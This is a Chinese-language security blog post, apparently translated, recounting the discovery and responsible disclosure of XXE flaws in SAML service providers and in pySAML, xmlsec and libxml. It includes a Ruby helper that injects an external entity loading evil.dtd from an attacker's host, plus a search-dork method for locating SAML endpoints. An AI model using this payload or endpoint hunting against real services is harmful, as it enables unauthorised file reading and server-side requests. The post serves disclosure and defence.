SAML的脆弱性分析

Jarry • 2017年5月5日 • 漏洞分析 • 阅读 653

Security Assertion Markup Language(SAML)

根据维基百科： “ SAML是一种基于XML的开放标准数据格式，用于在各方之间交换认证和授权数据，特别是身份提供商和服务提供商之间。SAML是OASIS安全服务技术委员会的产品。SAML可追溯至2001年，SAML的最新重大更新于2005年。我们可以确定一个简单的事实：SAML是XML。因此，许多开发人员使用第三方XML解析器构建应用程序，或者自己编写用来解析SAML的payload。在这两种情况下，两者都可能是一件坏事。众所周知，XML是一种非常丰富的协议，可以通过多种方式被利用。其中一种方式是XXE，这是一种漏洞，允许攻击者加载远程主机，读取用户文件等。

The Vulnerability(s)

早在8月份，我们发现我们使用的云端第三方应用程序容易受到XXE攻击。在找到漏洞后，我们负责漏洞披露流程，对公司的安全性进行了适当的记录和跟踪，同时我们提出了这个问题。

“如果这些应用很脆弱，还有其他的哪些应用也容易受到攻击呢？Java和其他具有已知XXE漏洞的语言库可以追溯到2013年，所以我认为这大部分是一个固定的问题，没有什么新的可以找到的。尽管如此，我正在努力，重新测试了所有已知的SAML SP端点; 但我能从哪里得到一个测试列表？完全开玩笑，我为云识别提供商工作，而我们自己的应用程序是世界上最大的SAML集成列表之一。:-)我有足够的ACL端点来测试。

def saml_inject(text, ip)
  text.gsub(
    “<?xml version=\”1.0\” encoding=\”UTF-8\”?>”,
    “<?xml version=\”1.0\” encoding=\”UTF-8\”?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \”http://#{ip}/evil.dtd\"> %remote;]>”
  )
end

def SAML_recode(a)
  CGI.escape(Base64.encode64(a).strip)
end

def SAML_decode(a)
  Base64.decode64(CGI.unescape(a))
end

最好的安全团队是一个自动化的“懒惰”团队

我坚信“通过自动化实现自己的工作”是最好的扩展方式，让您集中精力面对不能自动化的挑战。所以为了与自己能不做这么无聊的事，我创建了一个ruby脚本：https://gist.github.com/FreedomCoder/77804052accd69e5d2a9ceb879d7014这让我能够轻松测试新的SAML SP，而我正在忙于搜索更多的端点进行测试。你拥有的越多，你想要的越多..为了找到更多，我需要Google或Bing的帮助，以了解大多数SAML库正在使用的默认路径。这是一个很大的假设，但是大多数使用第三方库的人绝对不会改变默认端点。

inurl:default/third-party/library/path/to/saml我也意识到很多设备也能够使用SAML，所以我对已知的设备进行了相同类型的搜索。发现这样的设备（Code42的Carbonate Pro服务器）在5.3版本及以下版本中是易受攻击的，但在向他们报告漏洞后，他们说他们知道这个问题，并且正在提供修复程序。https://httpsonly.blogspot.com.au/2017/01/0day-writeup-xxe-in-ubercom.html在那个时候，我报告了这个问题的公司之一，回到我面前问我是否可以重新告诉我，他们已经把所有的library打补丁到最新版本。我很快重新测试，我们惊讶的是，这个漏洞依然存在。我问他们是否可以与我分享他们正在使用的library和language，我必须说，和我配合的开发人员很棒，能试图自己找到问题。总是喜欢与关心的人合作。

报告

我发现pySAML容易受到XXE的影响，但仔细检查其代码后，我们意识到问题不在于pySAML，而是他们用的代码依赖关系。XMLSEC1在其他几个库中使用的核心库易受XXE的影响。我立即向他们的github存储库（https://github.com/rohe/pysaml2/issues/366）报告了一个漏洞，开始，我给定一个可以在python级别实现的解决方案，XMLSEC似乎是负责任的，因此我们在（https://github.com/lsh123/xmlsec/issues/43）上创建了另一个漏洞报告，但是在生成报告时，我们认为这个问题也不是完全的错误。XMLSEC使用libXML作为Gnome项目的核心库，即使该库已经在几年前已经报告了XXE，并且它们被修复，这是只是一个新的尚未被发现的易受攻击的路径。不过，我向XMLSE C报告了这个问题，经过几个小时的报告后，XMLSEC的首席开发人员立即在libXML上创建了一张提醒，他已经独立地确认问题确实存在于libXML中。https://bugzilla.gnome.org/show_bug.cgi?id=772726。要概括一下，我们不仅有几个应用程序易受攻击，而且除了其他几个SAML库（pySAML， xmlSEC，go-SAML等）还有更多！

最后的想法

可悲的是，libXML社区花了很多时间来制定一个可以运行的补丁，并且不会对向后兼容性造成太大的损害，因为提出的修补程序旨在关闭该错误，而且还强制更改默认值行为。最后，在一段时间之后，libXML，xmlSEC，go-SAML，pySAML或其他已知的易受攻击的库都更新了补丁。这是一个有趣的错误，我们偶然发现，现在轮到你使用Github Gist Script测试你的自定义应用程序和第三方代码，使互联网不那么脆弱。
